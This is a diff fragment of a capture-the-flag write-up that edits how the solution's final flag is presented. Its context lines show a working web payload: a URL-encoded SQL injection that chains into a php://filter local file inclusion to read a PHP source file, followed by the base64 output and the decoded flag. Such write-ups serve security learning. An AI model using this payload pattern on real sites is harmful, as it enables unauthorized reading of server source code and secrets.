@@ -28,5 +28,5 @@ i got this response :
 that php file looked interesting, let's open it : http://tasks.ctf.com.ua:13372/index.php?country=%27%20union%20select%20%27php://filter/read=convert.base64-encode/resource=iulersiueruigfuihseruhgi.php%27%20--%20-
 <br>
 got this : PD9waHAKCiRmbGFnPSJoNGNrMXR7JFFMJkxGST1GUjEzTkQkfSI7Cgo/Pgo= <br>
-base64 decode it and find <code>"<?php$flag="h4ck1t{$QL&LFI=FR13ND$}";?>"</code>
+base64 decode it and find some php code with flag<code>"$flag="h4ck1t{$QL&LFI=FR13ND$};"</code>
 that's our flag
